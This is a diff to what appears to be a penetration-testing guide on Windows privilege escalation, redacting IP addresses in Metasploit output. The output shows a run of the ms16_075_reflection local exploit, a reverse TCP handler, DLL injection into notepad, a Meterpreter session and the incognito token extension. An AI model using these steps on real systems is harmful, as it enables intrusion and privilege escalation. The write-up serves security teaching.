@@ -17,7 +17,7 @@ Once you've achieved a shell of some sort, and the user you are running / impers
 
 ```msf exploit(windows/local/ms16_075_reflection) > run
 
-[*] Started reverse TCP handler on 45.63.13.23:31334
+[*] Started reverse TCP handler on -snip-:31334
 [*] Launching notepad to host the exploit...
 [+] Process 3448 launched.
 [*] Reflectively injecting the exploit DLL into 3448...
@@ -25,8 +25,8 @@ Once you've achieved a shell of some sort, and the user you are running / impers
 [*] Exploit injected. Injecting payload into 3448...
 [*] Payload injected. Executing exploit...
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-[*] Sending stage (206403 bytes) to 212.83.175.132
-[*] Meterpreter session 16 opened (45.63.13.23:31334 -> 212.83.175.132:52436) at 2018-07-24 09:52:58 -0400
+[*] Sending stage (206403 bytes) to -snip-
+[*] Meterpreter session 16 opened (-snip-:31334 -> -snip-:52436) at 2018-07-24 09:52:58 -0400
 
 meterpreter > load incognito
 Loading extension incognito...Success.
